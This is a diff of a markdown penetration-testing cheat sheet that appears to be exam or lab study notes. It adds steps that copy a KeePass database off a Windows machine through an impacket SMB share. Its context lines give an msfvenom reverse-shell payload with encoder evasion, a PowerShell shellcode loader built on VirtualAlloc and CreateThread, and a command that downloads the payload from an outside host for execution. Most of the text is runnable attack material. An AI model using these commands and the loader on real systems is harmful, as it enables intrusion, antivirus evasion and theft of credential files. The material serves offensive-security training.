@@ -321,6 +321,15 @@ set SRVHOST | PAYLOAD | LHOST | LPORT | TARGET then run
 copy any paste the payload into the cmd shell. you should have a new session
 after getting the meterpreter session run post/multi/recon/local_exploit_suggester
 use any of the suggested exploits and run it
+- use godpotato
+
+Copy a file from windows to Linux by setting up smb server
+setup the smbserver
+-     impacket-smbserver raman `pwd`
+cd to the share
+-     cd \\10.10.16.13\raman
+-     cp c:\users\raman\raman.kdbx .
+- 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
@@ -801,7 +810,7 @@ sudo fuser -k 443/tcp
 -     msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -i 10 -e x86/shikata_ga_nai -f powershell -v sc
 - create a powershell named file.ps1 and save the following script into it with binary that you got from msfvenom
 -     $code = '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);'; $var1 = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru; [Byte[]]; [Byte[]]$var2 = <place your shellcode here>; $size = 0x1000; if ($var2.Length -gt 0x1000) {$size = $var2.Length}; $x = $var1::VirtualAlloc(0,$size,0x3000,0x40); for ($i=0;$i -le ($var2.Length-1);$i++) {$var1::memset([IntPtr]($x.ToInt32()+$i), $var2[$i], 1)}; $var1::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
-- transfer the payload to Windows machine
+- transfer the payload/PowerUp.ps1 to Windows machine
 -     powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.2.10/file.ps1','file.ps1')
 - Run the shell in Windows PowerShell
 -     .\file.ps1
